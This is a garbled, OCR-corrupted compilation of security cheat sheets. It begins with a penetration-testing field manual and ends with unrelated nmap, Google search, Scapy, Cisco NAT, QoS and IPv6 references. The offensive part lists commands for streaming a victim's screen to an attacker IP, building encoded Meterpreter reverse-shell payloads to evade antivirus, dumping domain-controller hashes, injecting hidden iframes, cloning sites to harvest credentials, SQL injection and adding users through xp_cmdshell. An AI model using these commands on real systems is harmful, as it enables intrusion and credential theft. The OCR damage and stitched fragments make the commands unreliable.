ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2\nnmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 I grep \"Nmap\" I cut -d \" \" -f\nTCP Port Scanner in port range [startPort] to [endPort]:\n# Use cvlc (command line VLC) on target to mitigate popups\nCAPTURE AND STREAM THE SCREEN OVER UDP TO <ATTACKER:IP>: 1234\n# Start a listener that stores the stream in a file.\nvlc udp://@:1234 :sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,\nab=128,channels=2,samplerate=44100):file{dst=test.mp4) :no-sout-rtp-sap\n# This may make the users screen flash. Lower frame rates delay the video.\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):udp{dst= attackerip :1234) :no-sout-rtp-sap :no-sout-\n# Start a listener that stores the stream to a file\nsout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,samp\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):http{mux=ffmpeg{mux=flv),dst=:8080/) :no-sout-rtp-sap :no-\n# Start a listener on attacker machine for multicast\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):udp{dst= multicastaddr :1234) :no-sout-rtp-sap :no-sout-\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):file{dst=C:\\\\Program Files (x86)\\\\VideoLAN\\\\VLC\\\\test.mp4)\n:no-sout-rtp-sap :no-sout-standard-sap :ttl=1 :sout-keep\nvlc dshow:// :dshow-vdev= 11None\" :dshow-adev=\"Your Audio Device 11\nIf already in ssh session, press SHIFT -C to configure tunnel\nSETUP Xll FORWARDING FROM TARGET, FROM ATTACK BOX RUN\nREMoTE PORT FORWARD ON 808 0 , FORWARD TO ATTACKER ON 4 43\nLoCAL PORT FORWARD ON PORT 8080 ON ATTACK BOX AND FORWARDS\nTHROUGH SSH TUNNEL TO PORT 3300 ON INTERNAL TARGET 3. 3. 3. 3\nDYNAMIC TUNNEL USED IN CONJUNCTION WITH PROXYCHAINS . ENSURE\n/ETC/PROXYCHAINS. CONF IS CONFIGURED ON CORRECT PORT (1080)\nCREATE ENCODED METERPRETER PAYLOAD (FOR LINUX: -T ELF -o\n./msfpayload windows/meterpreter/reverse tcp LHOST~ ip\n./msfencode -t exe -o callback.exe -e x86/shikata_ga nai -c 5\n./msfpayload windows/meterpreter/bir.d_tcp RP.OST~ ip\nCREATE ENCODED PAYLOAD USING MSFVENOM USING EXE TEMPLATE\n./msfvenorn --payload windows/meterpreter/reverse~tcp --format exe\ntemplate calc.exe -k --encoder x86/shikata ga nai -i 5\nPASS A SHELL (BY DEFAULT WJ:LL LAUNCH NOTEPAD AND :INJECT)\nIMPERSONATE TOKEN (DROP TOKEN WILL STOP IMPERSONATING)\nclient. railgun. user32. t.jessageBoxA ( 0, \"got\", 11 JOU\", \"HB ~OK\")\nGRUB Henu:Add 'single' end of kernel line. Reboot. Change root pass. reboot\n# For --format~netlmv2 replace $NETLM with $NETLMv2\n$NETLt1$112233445566\"\"88$0836F0858124F338958-5F81951905DD2F85252CC-318825\nusername:$NETLt1$ll2233445566\"\"88$0836F0858124F338958\"5F81951905DD2F85252CC\"\nusername:$NETLt1$112233445566\"\"88$0836F0858124F338958-5F81951905DD2F85252CC\"\n# Exactly 36 spaces between USER and HASH (SAP8 and SAPG)\n$SHA1p$salt$59b3e8d63-cf9\"edbe2384cf59cb\"453dfe30-89\nusername:$SHA1p$salt$59b3e8d63-cf9\"edbe2384cf59cb-453dfe30-89\n#Add lower(@), upper(,), ~umber(%), and symbol( I to the end of the word\nUse custom special character set and add 2 numbers then special character\nmaskprocessor -custom-charset1~\\!\\@\\#\\$ baseword?d?d?l\nDownload: http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopj[X]\\windows\\\n\\\\?\\GLOBALROOT\\Device\\Harddisf:VolumeShadowCopj[X]\\windows\\\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopj[X]\\windows\\\nDownload tools: http://www.ntdsx~ract.com/downloads/ntds dump_hash.zip\nConfigure and Make source code for libesedb from the extracted package\nUse esedbdumphash to ex~ract the datatable from ntds.dit.\n8a.Use dsdump.pj to dump hashes from datatable using bootkej from\n8b.Use bkhive and samdump2 to dump hashes from SN1 using bootkej from\n# dig +short [t1D51 SHA-1] .malware.hash.cjmrc.J.com TXT\nConvert timestamp= perl-e 'print scalar localtime( timestamp ) , ''\\n'''\n!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\n//Site refresh=window.setTimeout(function() {window.location.href='http://ww\nframe src=''/e'' frarneborder=O scrolling=no noresize=noresize ;,\napplet archive=''legit.jar'' code=''This is a legit applet'' width=''l''\niframe src=\"http://1.1.1.1 11 width=\"O\" height=\"O\" frameborder=\"O\"\ntabindex=''-1'' title=''ernpty'' style=visibility:hidden;display:none''\nwget -q --save-cookies=cookie.txt --keep-session-cookies --post-\ndata=\"username: admin&password=pass&Login=Login\" http: I I .. url ,. I login. php\ncurl -I -X HEAD -A \"t~ozilla/5.0 (compatible; HSIE \".01; Windows NT 5.0)\"\nThe steps below will clone a website and redirect after 3 seconds to\nanother page requiring basic authentication. It has proven very useful for\ncollecting credentials during social engineering engagements.\nThrough SET, use the 'Website Attack Vector' menu to clone your\nIn a new terminal create a new directory (lowercase L)\ncd /pentest/exploits/set/src/web clone/site/template/\nCreate blank password file to be used for basic auth\nwget http://wkhtmltopdf.googlecode.com/files/wkhtmltoimage-0.11.0 rc1-\ntar -jxvf wkhtmltoimage-0.11.0 rc1-statlc-i386.tar.bz2\ngit clone git://github.com/SpiderLabs/Nmap-Tools.git\ncp http-screenshot.nse /usr/local/share/nmap/scripts/\nOS/version detection using screenshot script (screenshots saved as .png):\nScript will generate HTML preview page with all screenshots:\nls -1 '.png I awk -F : ' {print $1\":\"$2\"\\n BR- IMG SRC=\\\"\"$1\"%3A\"$2\"\\\"\nhttps://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-x86_64.tar.bz2\ngit clone https://bitbucket.org/LaNMaSteR53/peepingtom.git\nExtract and copy phantomjs from phantomjs-1.9.2-linux-x86 64.tar.bz2 and\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\"\nSQL INJECTION AGAINST SPECIFIC PARAMETER WITH DB TYPE SPECIFIED\n./sqlmap.py -u ''http:// url '' --data=''id=l&str=val'' -p ''id''\nLogin and note cookie value (cookie1=val1, cookie2=val2)\n./sqlrnap.py -u ''http://\u00b7 url '' --data=''id=l&str=val'' -p ''id''\nSQL INJECTION AND COLLECT DB VERSION 1 NAME 1 AND USER\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\" -p \"id\" -b --current-db\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\" -p \"id\" --tables -D\n./sqlrnap.py -u \"http:// url \" --data=\"id=l&str=val\" -p \"id 11 --columns -T\nSELECT TOP 1 TABLE NAME FROl1 INFORl1ATION SCHEt1A. TABLES\nSELECT name, password hash FROM master.sjs.sgl logins\nSELECT relname, A.attnaxe FROl1 pg_class c, pg_namespace N, pg_attribute A,\n(A.attrelid-C.oid) AND (A.atttjpid-T.oid) AND (A.attnum 0) AND\nSELECT c.relname FROM pg_catalog.pg_class cLEFT JOIN\n( 'r','') AND n.nspnarne NOT IN ( 'pg catalog', 'pg toast') AND\nSELECT table schema, table name, column_ name FR0t1\ntable schema != 'rnysql' AND table schema != 'information schema'\n-U sa -P pwd -Q \"exec xp cmdshell 'net user /add user\nSELECT DISTINCT grantee FR0t1 dba SfS_prlvS WHERE ADlHN OPTION\nCONVERT WINDOWS REGISTRY HEX FORMAT TO READABLE ASCII\nmessage= re.findall(r' message (.'?) /message ', data,re.DOTALL)\nprint ''File %s contains %s'' % (str(msg) ,message)\nopenssl req -new -x509 -keyout cert.pem -out cert.pern -days 365 -nodes\nhttpd ~ BaseHTTPServer.HTTPServer( ('192.168.1.10' ,443),\nhttpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)\nPYTHON EMAJ:L SENDER ( * SENDMAJ:L MUST BE INSTALLED)\nLOOP THROUGH IP LIST, DOWNLOAD FILE OVER HTTP AND EXECUTE\nPYTHON HTTP BANNER GRABBER (* TAKES AN IP RANGE, PORT, AND\nparser.add option{''-t'', dest=''iprange'',help=''target IP range, i.e.\nparser.add option(''-p'', dest=''port'',default=''80'',help=''port, default=BO'')\nparser.add=option(\"-d\", dest=\"delay\",default=\".5\",help=\"delay (in seconds),\nips.append('%s.%s.%s.%d' % (octets[O],octets[1] ,octets[2],i))\nresponse= urllib2.urlopen('http://%s:%s' % (ip,opts.port))\nprint '%s : %s' % (header,headers[header] .get('server'))\n* When you craft TCP packets with Scapy, the underlying OS will not\nrecognize the initial SYN packet and will reply with a RST packet. To\nmitigate this you need to set the following Iptables rule:\niptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP\nsr ( IPv6 ( src=\" ipv6 n' dst=\".ipv6 n I /ICHP (I I\ndst=\" ip \")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4) I\n# Add iptables rule to block attack box from sending RSTs\nSYN=ip/TCP(rport=RandNum(6000,-000),dport=BO,flags=\"S\",seq=4)\nACK=ip/TCP(sport=SYNACK.dport,dport=BO,flags=\"A\",seq=SYNACK.ack,ack=SYNACK.\nProto= \u00b7\"tcp\",PeerAddr= \u00b7 11 12-:'.0.0.l\",PeerPort= $port);\njhttps://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm\n[1] t1ubix. Linux/Unix/BSD Post-Exploitation Command List.\n[2] Tomes, Tim. Safely DGmping Hashes from Live Domain Controllers.\nflcto~g_l_cigtcorr.:._\u00b7 com/1..QlUll.Lsafel\u00b7r-dumping-hashes-_from-li v. html. Accessed\nll!J~..Q_; __ L.L\u00a3.\u00a3D_t_~_.\u00a7_~nhQI'~\u00a7..:L__!_net /cheat-\nsheet/shells/reverse-shell-cheat-sheet. Accessed on 15 Nov 2012.\nhtto://bernardodame 1 e.blogscat.com/2Jll/09/reverse-shel-s-one-liners.html.\n[5] SANS Institute. IEE 802.11 Pocket Reference Guide.\nhttc://www.willhac}:forsushi.com/paoers/80211 Pocket Reference Guide.pdf.\n[6] Tomes, Tim. Remote t1alware Deployment and a Lil' AV Bypass.\nhttp://oauldotcom.com/2012/C51remote-malware-deplo\u00b7;ment-and.html. Accessed\nhttos://\\Jww.trusredsec.com/dow~loads/tools-downloadi. Accessed on 25 Jan\nCopyright 2012 TrustedSec, LLC. All rights reserved.\nmodification, are permitted prov~ded that the following conditions are met:\nRedistributions in binarJ form must reproduce the above copJright notice,\nand/or other materials provided with the distribution.\nOF t1ERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAit1ED.\nthose of the authors and should not be interpreted as representing official\npolicies, either expressed or implied, of TRUSTEDSEC, LLC.\n[8] SSL and stunnel. httc://www.J:ioptrix.com/blcq/?o=68-. Accessed on 01\nh t to:/ /blog. spider labs. com /:2 012/0 6/usinq-nrnao-to-screenshot -'deb-\n[10] ''Schtasks Persistence with PowerShell One Liners''.\nhttc://blog.strategicc\u00b7\u00b7ber.com/2013/11/09/schtasl:s-oers~stence-with-\n__ ~.:::-__ L+. .. ners_/_. Accessed on 21 Nov 2013.\nNmap's script categories include, but are not limited to, the\nauth: Utilize credentials or bypass authentication on target\nbroadcast: Discover hosts not included on command line by\nbrute: Attempt to guess passwords on target systems, for a\nvariety of protocols, including http, SNMP, IAX, MySQL, VNC,\ndefault: Scripts run automatically when -sC or -A are used.\ndiscovery: Try to learn more information about target hosts\nthrough public sources of information, SNMP, directory services,\ndos: May cause denial of service conditions in target hosts.\nexternal: Interact with third-party systems not included in\nfuzzer: Send unexpected input in network protocol fields.\nintrusive: May crash target, consume excessive resources, or\notherwise impact target machines in a malicious fashion.\nmalware: Look for signs of malware infection on the target\nsafe: Designed not to impact target in a negative fashion.\nversion: Measure the version of software or protocol spoken\nExample: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254\n--exclude  --excludefile file exclude host or list from file\n--traceroute: trace path to host (for topology map)\n--max-os-tries set the maximum number of tries against a target\n--resume file resume aborted scan (from oN or oG output)\nnmap -T4 --max_rtt_timeout 200 --initial_rtt_timeout 150 --min_hostgroup 512 --max_retries 0 -n -P0 -p80\nnmap -sP -PE -PP -PS21,23,25,80,113,31339 -PA80,113,443,10042 --source-port 53 -T4\nnmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -PO --script all\nnmap -sP -PE -PS22,25,80 -PA21,23,80,3389 -PU -PO --traceroute\n--script-trace print incoming and outgoing communication\nIANA port assignments published at http://www.iana.org/assignments/port-numbers\nWhat To Type Into Search Box (& Description of Results)\nconference site:www.sans.org (Search SANS site for conference info)\nplasma television $1000...1500 (Search for plasma televisions between $1000 and $1500)\nhockey date: 3 (Search for hockey references within past 3 months; 6 and 12-month date-\nsafesearch: sex education (Search for sex education material without returning adult sites)\nlink:www.sans.org (Find pages that link to the SANS website)\ninfo:www.sans.org (Find information about the SANS website)\nrelated:www.stanford.edu (Find websites related to the Stanford website)\nintitle:conference (Find pages with \"conference\" in the page title)\nallintitle:conference SANS (Find pages with \"conference\" and \"SANS\" in the page title.\ninurl:conference (Find pages with the string \"conference\" in the URL)\nallinurl:conference SANS (Find pages with \u201cconference\u201d and \"SANS\" in the URL.\nfiletype:ppt (Find files with the \"ppt\" file extension.\ncache:www.sans.org (Show the cached version of the page without performing the search)\nphonebook:Rick Smith MD (Find all phone book listing for Rick Smith in Maryland.\nauthor:Rick (Find all newsgroup postings with \"Rick\" in the author name or email address.\ninsubject:Mac OS X (Find all newsgroup postings with \"Mac OS X\" in the subject of the\ndefine:sarcastic (Get the definition of the word sarcastic)\nstock:AAPL (Get the stock information for Apple Computer, Inc.)\nUse this sheet as a handy reference that outlines the\nvarious Google searches that you can perform. It is\nreference guide and refresher on all Google advanced\noperators used in this course. The student could also\nhttp://www.google.com/intl/en/help/refinesearch.html\nSend packets much faster at layer two using tcpreplay\nsr1(pkt, inter=0, loop=0, count=1, iface=N), srp1(\u2026)\nRecord packets off the wire; returns a list of packets when stopped\n>>> sendp(Ether()/IP(dst=\"192.0.2.1\")/UDP(dport=53))\n>>> srloop(IP(dst=\"packetlife.net\")/ICMP(), count=3)\nMatches a host as the IP source, destination, or either\nMatches a host as the Ethernet source, destination, or either\nMatches packets to or from an endpoint residing in network\nMatches TCP or UDP packets to/from a port in the given range\nMatches 802.11 frames based on type and optional subtype\nMatches 802.1Q frames, optionally with a VLAN ID of vlan\nMatches MPLS packets, optionally with a label of label\nip nat outside source static 174.143.212.133 10.0.0.47\nip nat outside source static 174.143.213.240 10.0.2.181\n! Create an access list to match inside local addresses\nip nat pool MyPool 192.0.2.1 192.0.2.254 prefix-length 24\n! Dynamic translations can be combined with static entries\nip nat inside source static tcp 10.0.0.3 8080 192.0.2.1 80\nip nat inside source static udp 10.0.0.14 53 192.0.2.2 53\nip nat outside source static tcp 174.143.212.4 23 10.0.0.8 23\nip nat inside source list 11 interface FastEthernet1 overload\nip nat pool LoadBalServers 10.0.99.200 10.0.99.203 prefix-length 24 type rotary\n! Enable load balancing across inside hosts for incoming traffic\nip nat inside destination list 12 pool LoadBalServers\nResource Reservation Protocol (RSVP) is used to reserve bandwidth per-\nPackets are individually classified and marked; policy decisions are made\nThe first three bits of the IP TOS field; limited to 8 traffic classes\nThe first six bits of the IP TOS are evaluated to provide more granular\nclassification; backward-compatible with IP Precedence\nThe individual QoS action performed at each independent DiffServ node\nTrust Boundary \u00b7 Beyond this, inbound QoS markings are not trusted\nTail Drop \u00b7 Occurs when a packet is dropped because a queue is full\nImposes an artificial ceiling on the amount of bandwidth that may be\nconsumed; traffic exceeding the policer rate is reclassified or dropped\nSimilar to policing but buffers excess traffic for delayed transmission;\nmakes more efficient use of bandwidth but introduces a delay\nClass Selector (CS) \u00b7 Backward-compatible with IP Precedence values\nAssured Forwarding (AF) \u00b7 Four classes with variable drop preferences\nExpedited Forwarding (EF) \u00b7 Priority queuing for delay-sensitive traffic\nFlows adjust TCP window sizes in synch, making inefficient use of a link\nVariable-length subnet masks are an arbitrary length\nbetween 0 and 32 bits; CIDR relies on VLSMs to define\nFlow Label (20 bits) \u00b7 Identifies unique flows (optional)\nPayload Length (16 bits) \u00b7 Length of the payload in bytes\nNext Header (8 bits) \u00b7 Header or protocol which follows\nHop Limit (8 bits) \u00b7 Similar to IPv4's time to live field\nDestination Address (128 bits) \u00b7 Destination IP address\nAnycast \u00b7 An address configured in multiple locations\nCarries additional information which must be examined by every\nIncluded when a packet has been fragmented by its source\nCarries additional information which pertains only to the recipient\nTransporting IPv4 and IPv6 across an infrastructure simultaneously\nIPv6 traffic is encapsulated into IPv4 using IPv6-in-IP, UDP (Teredo),\nor Intra-Site Automatic Tunnel Addressing Protocol (ISATAP)\nStateless IP/ICMP Translation (SIIT) translates IP header fields, NAT\nProtocol Translation (NAT-PT) maps between IPv6 and IPv4 addresses"}
